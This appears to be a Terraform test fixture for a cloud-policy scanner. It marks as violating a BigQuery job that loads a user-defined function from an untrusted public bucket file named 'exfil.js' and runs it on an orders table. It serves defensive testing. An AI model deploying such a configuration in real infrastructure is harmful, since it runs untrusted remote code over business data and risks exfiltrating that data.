# Bigquery.C72 (bigquery_udf_bucket) - allowlist - VIOLATING

# UDF loaded from an untrusted bucket: 1 finding
resource "google_bigquery_job" "rogue_udf" {
  job_id = "rogue_udf"

  query {
    query                = "SELECT sketchy_udf(col) FROM analytics_data.orders"
    maximum_bytes_billed = "1000000000"

    user_defined_function_resources {
      resource_uri = "gs://random-public-bucket/exfil.js"
    }
  }
}
